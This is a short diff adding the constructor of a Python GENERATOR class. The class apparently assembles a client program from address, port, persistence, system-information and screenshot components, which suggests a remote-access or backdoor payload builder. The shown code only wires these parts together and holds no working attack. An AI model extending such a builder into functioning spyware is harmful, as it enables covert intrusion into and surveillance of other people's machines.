@@ -583,4 +583,19 @@ class GENERATOR:
     data = ""
     flname = ""
 
-    
+    def __init__(self, prs):
+        self.address = prs.address
+        self.port    = prs.port 
+        self.source  = prs.source
+        self.persistence = prs.persistence
+        self.output  = self.get_output(prs.output)
+        self.pather  = self.get_path()
+        self.v_imports = self.get_imports()
+        self.v_consts  = self.get_consts()
+        self.v_persistence = self.get_persistence()
+        self.v_sysinfo = self.get_sysinfo()
+        self.v_screenshot = self.get_screenshot()
+        self.v_client  = self.get_client()
+        self.v_main    = self.get_main()
+
+
